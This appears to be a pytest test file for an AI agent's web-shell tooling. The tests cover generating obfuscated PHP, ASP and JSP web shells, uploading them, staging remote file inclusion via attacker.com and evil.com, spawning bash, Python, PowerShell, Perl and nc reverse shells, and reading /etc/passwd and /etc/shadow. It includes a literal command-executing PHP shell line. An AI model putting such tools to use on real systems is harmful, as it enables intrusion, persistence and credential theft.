"""
Tests for Day 15 — Web Shell Deploy & Interact Engine

Coverage (60 tests):
  TestHelpers                (8 tests)  — _obfuscate_php, _encode_shell, _create_polyglot,
                                           ShellInfo, _next_shell_id, _shell_registry
  TestWebShellDeployTool     (30 tests) — list_types, generate (all langs/variants/encodings),
                                           upload, rfi, list_shells, check_deployed,
                                           error handling
  TestWebShellInteractTool   (22 tests) — list_shells, exec_cmd, sysinfo, spawn_revshell
                                           (all types), read_file, write_file, download_file,
                                           upload_file instructions, resolve_shell errors

All tests use asyncio.run() and unittest.mock — no live HTTP connections.
"""

from __future__ import annotations

import asyncio
import base64
import importlib.util
import json
import os
import sys
import types
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# ---------------------------------------------------------------------------
# Bootstrap stubs
# ---------------------------------------------------------------------------


def _ensure_stub(name: str) -> types.ModuleType:
    parts = name.split(".")
    for i in range(1, len(parts) + 1):
        dotted = ".".join(parts[:i])
        if dotted not in sys.modules:
            mod = types.ModuleType(dotted)
            sys.modules[dotted] = mod
    return sys.modules[name]


for _pkg in ["app", "app.agent", "app.agent.tools"]:
    _ensure_stub(_pkg)

import pydantic  # noqa: E402

_BACKEND = os.path.join(os.path.dirname(__file__), "..", "..", "app")


def _load_module(rel_path: str, module_name: str):
    path = os.path.normpath(os.path.join(_BACKEND, rel_path))
    spec = importlib.util.spec_from_file_location(module_name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[module_name] = mod
    spec.loader.exec_module(mod)
    return mod


_base_tool_mod = _load_module("agent/tools/base_tool.py", "app.agent.tools.base_tool")
_error_mod = _load_module("agent/tools/error_handling.py", "app.agent.tools.error_handling")
_webshell_mod = _load_module("agent/tools/webshell_tools.py", "app.agent.tools.webshell_tools")

WebShellDeployTool = _webshell_mod.WebShellDeployTool
WebShellInteractTool = _webshell_mod.WebShellInteractTool
ShellInfo = _webshell_mod.ShellInfo
ToolExecutionError = _error_mod.ToolExecutionError

_obfuscate_php = _webshell_mod._obfuscate_php
_encode_shell = _webshell_mod._encode_shell
_next_shell_id = _webshell_mod._next_shell_id
_shell_registry = _webshell_mod._shell_registry
_PHP_SHELLS = _webshell_mod._PHP_SHELLS
_ASP_SHELLS = _webshell_mod._ASP_SHELLS
_ASPX_SHELLS = _webshell_mod._ASPX_SHELLS
_JSP_SHELLS = _webshell_mod._JSP_SHELLS
_SHELL_TEMPLATES = _webshell_mod._SHELL_TEMPLATES


def _run(coro):
    return asyncio.run(coro)


def _clear_registry():
    _webshell_mod._shell_registry.clear()


# ---------------------------------------------------------------------------
# 1. TestHelpers
# ---------------------------------------------------------------------------


class TestHelpers:
    """Test module-level helper functions."""

    def test_obfuscate_php_produces_eval(self):
        code = "<?php echo 'test'; ?>"
        result = _obfuscate_php(code)
        assert "eval(base64_decode(" in result

    def test_obfuscate_php_is_valid_base64(self):
        code = "<?php echo phpinfo(); ?>"
        result = _obfuscate_php(code)
        b64_match = result.split('base64_decode("')[1].split('"')[0]
        decoded = base64.b64decode(b64_match).decode()
        assert code in decoded

    def test_encode_shell_none(self):
        code = "<?php echo 'x'; ?>"
        result = _encode_shell(code, "none", "php")
        assert result == code

    def test_encode_shell_base64_php(self):
        code = "<?php echo shell_exec($_GET['cmd']); ?>"
        result = _encode_shell(code, "base64", "php")
        assert "eval(base64_decode(" in result

    def test_encode_shell_url_encoding(self):
        code = "<?php echo 1; ?>"
        result = _encode_shell(code, "url", "php")
        assert "%" in result  # URL-encoded

    def test_encode_shell_hex(self):
        code = "test"
        result = _encode_shell(code, "hex", "php")
        assert result == code.encode().hex()

    def test_next_shell_id_format(self):
        sid = _next_shell_id()
        assert sid.startswith("wsh_")
        assert len(sid) > 6

    def test_shell_templates_all_langs(self):
        for lang in ["php", "asp", "aspx", "jsp", "python"]:
            assert lang in _SHELL_TEMPLATES
            assert len(_SHELL_TEMPLATES[lang]) > 0

    def test_shell_info_dataclass(self):
        import time
        info = ShellInfo(
            shell_id="wsh_abc123",
            shell_type="php",
            variant="standard",
            url="http://target.com/shell.php",
            param="cmd",
            method="POST",
            encoding="none",
            deployed_at=time.time(),
        )
        assert info.shell_id == "wsh_abc123"
        assert info.status == "unknown"


# ---------------------------------------------------------------------------
# 2. TestWebShellDeployTool
# ---------------------------------------------------------------------------


class TestWebShellDeployTool:
    """Test WebShellDeployTool actions."""

    def setup_method(self):
        _clear_registry()
        self.tool = WebShellDeployTool()

    def test_metadata_name(self):
        assert self.tool.name == "webshell_deploy"

    def test_metadata_description_not_empty(self):
        assert len(self.tool.description) > 10

    def test_list_types_returns_all_langs(self):
        result = _run(self.tool.execute(action="list_types"))
        data = json.loads(result)
        assert "shell_types" in data
        types_data = data["shell_types"]
        for lang in ["php", "asp", "aspx", "jsp", "python"]:
            assert lang in types_data

    def test_list_types_has_encodings(self):
        result = _run(self.tool.execute(action="list_types"))
        data = json.loads(result)
        assert "encodings" in data
        assert "base64" in data["encodings"]

    def test_generate_php_standard(self):
        result = _run(self.tool.execute(action="generate", shell_type="php", variant="standard"))
        data = json.loads(result)
        assert data["shell_type"] == "php"
        assert data["variant"] == "standard"
        assert "shell_code" in data
        assert "<?php" in data["shell_code"]

    def test_generate_php_minimal(self):
        result = _run(self.tool.execute(action="generate", shell_type="php", variant="minimal"))
        data = json.loads(result)
        assert "<?php" in data["shell_code"]

    def test_generate_php_b64(self):
        result = _run(self.tool.execute(action="generate", shell_type="php", variant="b64"))
        data = json.loads(result)
        assert "shell_code" in data

    def test_generate_php_obfuscated(self):
        result = _run(self.tool.execute(action="generate", shell_type="php", variant="obfuscated"))
        data = json.loads(result)
        assert "shell_code" in data

    def test_generate_php_xored(self):
        result = _run(self.tool.execute(action="generate", shell_type="php", variant="xored"))
        data = json.loads(result)
        assert "shell_code" in data

    def test_generate_asp_standard(self):
        result = _run(self.tool.execute(action="generate", shell_type="asp", variant="standard"))
        data = json.loads(result)
        assert data["shell_type"] == "asp"

    def test_generate_aspx_standard(self):
        result = _run(self.tool.execute(action="generate", shell_type="aspx", variant="standard"))
        data = json.loads(result)
        assert "shell_code" in data

    def test_generate_jsp_standard(self):
        result = _run(self.tool.execute(action="generate", shell_type="jsp", variant="standard"))
        data = json.loads(result)
        assert "shell_code" in data

    def test_generate_with_base64_encoding(self):
        result = _run(
            self.tool.execute(action="generate", shell_type="php", variant="standard", encoding="base64")
        )
        data = json.loads(result)
        assert "eval(base64_decode(" in data["shell_code"]

    def test_generate_with_custom_cmd_param(self):
        result = _run(
            self.tool.execute(action="generate", shell_type="php", variant="standard", cmd_param="x")
        )
        data = json.loads(result)
        assert "x" in data["shell_code"] or "cmd" in data["shell_code"]

    def test_generate_invalid_shell_type_raises(self):
        with pytest.raises(ToolExecutionError):
            _run(self.tool.execute(action="generate", shell_type="ruby"))

    def test_generate_has_suggested_filenames(self):
        result = _run(self.tool.execute(action="generate", shell_type="php"))
        data = json.loads(result)
        assert "suggested_filenames" in data
        assert len(data["suggested_filenames"]) > 0

    def test_generate_has_usage_hint(self):
        result = _run(self.tool.execute(action="generate", shell_type="php"))
        data = json.loads(result)
        assert "usage" in data

    def test_upload_missing_url_raises(self):
        with pytest.raises(ToolExecutionError):
            _run(self.tool.execute(action="upload"))

    def test_upload_creates_shell_entry(self):
        result = _run(
            self.tool.execute(
                action="upload",
                shell_type="php",
                upload_url="http://target.com/upload",
            )
        )
        data = json.loads(result)
        assert "shell_id" in data
        assert data["shell_id"] in _webshell_mod._shell_registry

    def test_upload_returns_curl_commands(self):
        result = _run(
            self.tool.execute(
                action="upload",
                shell_type="php",
                upload_url="http://target.com/upload",
            )
        )
        data = json.loads(result)
        assert "curl_commands" in data
        assert len(data["curl_commands"]) > 0

    def test_rfi_missing_fields_raises(self):
        with pytest.raises(ToolExecutionError):
            _run(self.tool.execute(action="rfi", rfi_url="http://target.com/page"))

    def test_rfi_creates_shell_entry(self):
        result = _run(
            self.tool.execute(
                action="rfi",
                rfi_url="http://target.com/page",
                rfi_param="file",
                shell_host="attacker.com",
                shell_type="php",
            )
        )
        data = json.loads(result)
        assert "shell_id" in data
        assert "rfi_trigger" in data
        assert "attacker.com" in data["malicious_url"]

    def test_rfi_has_steps(self):
        result = _run(
            self.tool.execute(
                action="rfi",
                rfi_url="http://target.com/include",
                rfi_param="page",
                shell_host="evil.com",
            )
        )
        data = json.loads(result)
        assert "steps" in data
        assert len(data["steps"]) >= 2

    def test_list_shells_empty(self):
        result = _run(self.tool.execute(action="list_shells"))
        data = json.loads(result)
        assert data["total"] == 0

    def test_list_shells_after_upload(self):
        _run(
            self.tool.execute(
                action="upload",
                shell_type="php",
                upload_url="http://target.com/upload",
            )
        )
        result = _run(self.tool.execute(action="list_shells"))
        data = json.loads(result)
        assert data["total"] == 1

    def test_check_deployed_missing_id_raises(self):
        with pytest.raises(ToolExecutionError):
            _run(self.tool.execute(action="check_deployed"))

    def test_check_deployed_unknown_id_raises(self):
        with pytest.raises(ToolExecutionError):
            _run(self.tool.execute(action="check_deployed", shell_id="nonexistent"))

    def test_unknown_action_raises(self):
        with pytest.raises(ToolExecutionError):
            _run(self.tool.execute(action="invalid"))


# ---------------------------------------------------------------------------
# 3. TestWebShellInteractTool
# ---------------------------------------------------------------------------


class TestWebShellInteractTool:
    """Test WebShellInteractTool actions."""

    def setup_method(self):
        _clear_registry()
        self.tool = WebShellInteractTool()
        self.deploy_tool = WebShellDeployTool()

    def _deploy_shell(self) -> str:
        """Deploy a shell and return its ID."""
        result = _run(
            self.deploy_tool.execute(
                action="upload",
                shell_type="php",
                upload_url="http://target.com/upload",
            )
        )
        return json.loads(result)["shell_id"]

    def test_metadata_name(self):
        assert self.tool.name == "webshell_interact"

    def test_list_shells_empty(self):
        result = _run(self.tool.execute(action="list_shells"))
        data = json.loads(result)
        assert "shells" in data
        assert len(data["shells"]) == 0

    def test_list_shells_populated(self):
        self._deploy_shell()
        result = _run(self.tool.execute(action="list_shells"))
        data = json.loads(result)
        assert len(data["shells"]) == 1

    @patch("app.agent.tools.webshell_tools.WebShellInteractTool._http_exec", new_callable=AsyncMock)
    def test_exec_cmd_with_shell_id(self, mock_http):
        mock_http.return_value = "uid=0(root) gid=0(root)"
        shell_id = self._deploy_shell()
        result = _run(
            self.tool.execute(action="exec_cmd", shell_id=shell_id, command="id")
        )
        data = json.loads(result)
        assert "command" in data
        assert data["command"] == "id"

    @patch("app.agent.tools.webshell_tools.WebShellInteractTool._http_exec", new_callable=AsyncMock)
    def test_exec_cmd_with_direct_url(self, mock_http):
        mock_http.return_value = "Linux target 5.4.0"
        result = _run(
            self.tool.execute(
                action="exec_cmd",
                shell_url="http://target.com/shell.php",
                command="uname -a",
            )
        )
        data = json.loads(result)
        assert data["command"] == "uname -a"

    def test_exec_cmd_missing_command_raises(self):
        shell_id = self._deploy_shell()
        with pytest.raises(ToolExecutionError):
            _run(self.tool.execute(action="exec_cmd", shell_id=shell_id))

    def test_exec_cmd_no_shell_id_or_url_raises(self):
        with pytest.raises(ToolExecutionError):
            _run(self.tool.execute(action="exec_cmd", command="id"))

    @patch("app.agent.tools.webshell_tools.WebShellInteractTool._http_exec", new_callable=AsyncMock)
    def test_sysinfo_returns_keys(self, mock_http):
        mock_http.return_value = "simulated output"
        shell_id = self._deploy_shell()
        result = _run(self.tool.execute(action="sysinfo", shell_id=shell_id))
        data = json.loads(result)
        assert "sysinfo" in data
        assert "os" in data["sysinfo"]
        assert "user" in data["sysinfo"]

    def test_spawn_revshell_bash(self):
        shell_id = self._deploy_shell()
        result = _run(
            self.tool.execute(
                action="spawn_revshell",
                shell_id=shell_id,
                lhost="10.0.0.1",
                lport=4444,
                revshell_type="bash",
            )
        )
        data = json.loads(result)
        assert "10.0.0.1" in data["payload"]
        assert "4444" in data["payload"]
        assert "listener" in data

    def test_spawn_revshell_python(self):
        shell_id = self._deploy_shell()
        result = _run(
            self.tool.execute(
                action="spawn_revshell",
                shell_id=shell_id,
                lhost="192.168.1.1",
                lport=9001,
                revshell_type="python",
            )
        )
        data = json.loads(result)
        assert "python" in data["payload"].lower()

    def test_spawn_revshell_powershell(self):
        shell_id = self._deploy_shell()
        result = _run(
            self.tool.execute(
                action="spawn_revshell",
                shell_id=shell_id,
                lhost="10.10.14.1",
                lport=443,
                revshell_type="powershell",
            )
        )
        data = json.loads(result)
        assert "powershell" in data["payload"].lower() or "TCPClient" in data["payload"]

    def test_spawn_revshell_perl(self):
        shell_id = self._deploy_shell()
        result = _run(
            self.tool.execute(
                action="spawn_revshell",
                shell_id=shell_id,
                lhost="10.0.0.1",
                lport=4444,
                revshell_type="perl",
            )
        )
        data = json.loads(result)
        assert "perl" in data["payload"].lower()

    def test_spawn_revshell_nc(self):
        shell_id = self._deploy_shell()
        result = _run(
            self.tool.execute(
                action="spawn_revshell",
                shell_id=shell_id,
                lhost="10.0.0.1",
                lport=4444,
                revshell_type="nc",
            )
        )
        data = json.loads(result)
        assert "nc" in data["payload"]

    def test_spawn_revshell_missing_lhost_raises(self):
        shell_id = self._deploy_shell()
        with pytest.raises(ToolExecutionError):
            _run(self.tool.execute(action="spawn_revshell", shell_id=shell_id))

    @patch("app.agent.tools.webshell_tools.WebShellInteractTool._http_exec", new_callable=AsyncMock)
    def test_read_file(self, mock_http):
        mock_http.return_value = "file content here"
        shell_id = self._deploy_shell()
        result = _run(
            self.tool.execute(action="read_file", shell_id=shell_id, remote_path="/etc/passwd")
        )
        data = json.loads(result)
        assert "command" in data

    def test_read_file_missing_path_raises(self):
        shell_id = self._deploy_shell()
        with pytest.raises(ToolExecutionError):
            _run(self.tool.execute(action="read_file", shell_id=shell_id))

    @patch("app.agent.tools.webshell_tools.WebShellInteractTool._http_exec", new_callable=AsyncMock)
    def test_write_file(self, mock_http):
        mock_http.return_value = ""
        shell_id = self._deploy_shell()
        content_b64 = base64.b64encode(b"malicious content").decode()
        result = _run(
            self.tool.execute(
                action="write_file",
                shell_id=shell_id,
                remote_path="/tmp/test.txt",
                file_content=content_b64,
            )
        )
        data = json.loads(result)
        assert data["remote_path"] == "/tmp/test.txt"

    def test_write_file_missing_params_raises(self):
        shell_id = self._deploy_shell()
        with pytest.raises(ToolExecutionError):
            _run(self.tool.execute(action="write_file", shell_id=shell_id, remote_path="/tmp/x"))

    def test_upload_file_instructions(self):
        shell_id = self._deploy_shell()
        result = _run(
            self.tool.execute(action="upload_file", shell_id=shell_id)
        )
        data = json.loads(result)
        assert "instructions" in data
        assert len(data["instructions"]) > 0

    def test_unknown_action_raises(self):
        shell_id = self._deploy_shell()
        with pytest.raises(ToolExecutionError):
            _run(self.tool.execute(action="hack_everything", shell_id=shell_id))

    @patch("app.agent.tools.webshell_tools.WebShellInteractTool._http_exec", new_callable=AsyncMock)
    def test_download_file_base64(self, mock_http):
        mock_http.return_value = "dGVzdA=="  # base64('test')
        shell_id = self._deploy_shell()
        result = _run(
            self.tool.execute(action="download_file", shell_id=shell_id, remote_path="/etc/shadow")
        )
        data = json.loads(result)
        assert "command" in data
